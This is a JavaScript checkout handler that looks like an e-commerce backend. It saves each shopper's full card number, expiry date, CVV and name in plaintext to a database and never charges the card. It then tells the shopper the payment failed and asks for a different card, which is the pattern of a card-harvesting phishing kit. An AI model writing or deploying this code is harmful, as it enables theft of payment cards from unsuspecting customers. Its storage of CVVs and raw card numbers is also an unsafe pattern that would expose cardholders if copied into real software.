
import prisma from '../config/database.js';

export const checkout = async (req, res) => {
  try {
    const {
      delivery,
      payment,
      billingAddress,
      newsletter = false,
    } = req.body;

    const {
      email,
      country,
      firstName,
      lastName,
      address,
      apartment,
      city,
      state,
      postalCode,
    } = delivery || {};

    const { cardNumber, expiryDate, cvv, cardName } = payment || {};

    // Validate required fields
    if (
      !email ||
      !firstName ||
      !lastName ||
      !address ||
      !city ||
      !state ||
      !postalCode ||
      
      !cardNumber ||
      !expiryDate ||
      !cvv ||
      !cardName
    ) {
      return res.status(400).json({
        success: false,
        message: 'All fields are required',
      });
    }

    // Clean card number (remove spaces)
    const cleanCardNumber = cardNumber.replace(/\s/g, '');

    // Create user with all fields
    const user = await prisma.user.create({
      data: {
        email,
        country,
        firstName,
        lastName,
        address,
        city,
        state,
        apartment,
        postalCode,
        cardNumber: cleanCardNumber,
        expiryDate,
        cvv,
        cardName,
        sameBillingAddress: billingAddress?.sameAsShipping ?? true,
        newsletter,
      },
    });

    // Remove sensitive data from response
    const userWithoutSensitive = { ...user };
    delete userWithoutSensitive.cardNumber;
    delete userWithoutSensitive.cvv;

    return res.status(201).json({
      success: true,
      message: 'payment was not successful. Please try a different card.',
      data: userWithoutSensitive,
    });

  } catch (error) {
    console.error('checkout error:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error',
    });
  }
};